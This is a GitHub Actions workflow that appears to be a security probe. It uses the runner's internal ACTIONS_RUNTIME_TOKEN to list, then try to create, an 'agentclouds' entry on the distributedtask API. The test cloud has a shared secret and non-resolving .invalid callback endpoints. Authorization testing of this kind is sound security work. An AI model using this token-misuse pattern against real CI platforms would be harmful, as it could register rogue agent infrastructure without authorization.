name: dtscreen
on: workflow_dispatch
jobs:
  screen:
    runs-on: ubuntu-latest
    steps:
      - name: DOES AUTHZ EVER FIRE? url is RFC-reserved .invalid - cannot resolve, reaches nobody
        uses: actions/github-script@v7
        with:
          script: |
            const t = process.env.ACTIONS_RUNTIME_TOKEN, base = process.env.ACTIONS_RUNTIME_URL;
            async function call(label, path, method, body) {
              const opts = {method, headers:{Authorization:'Bearer '+t, Accept:'application/json;api-version=6.0-preview'}};
              if (body) { opts.headers['Content-Type']='application/json'; opts.body=JSON.stringify(body); }
              const r = await fetch(base + path, opts);
              const b = await r.text();
              core.info('== ' + label + ' http=' + r.status);
              core.info('   BODY ' + b.replace(/\s+/g,' ').slice(0,520));
            }
            await call('BASELINE BEFORE', '_apis/distributedtask/agentclouds', 'GET');
            await call('POST fully-valid body', '_apis/distributedtask/agentclouds', 'POST',
                       {name:'zz-dtscreen-0913-disposable', type:'zz-probe',
                        sharedSecret:'zzDTSCREEN0913disposableProbeSecret',
                        acquireAgentEndpoint:'https://zz-dtscreen-0913.example.invalid/acquire',
                        releaseAgentEndpoint:'https://zz-dtscreen-0913.example.invalid/release',
                        getAgentRequestStatusEndpoint:'https://zz-dtscreen-0913.example.invalid/status',
                        acquisitionTimeout:900, maxParallelism:1});
            await call('POST-STATE AFTER (own round trip)', '_apis/distributedtask/agentclouds', 'GET');
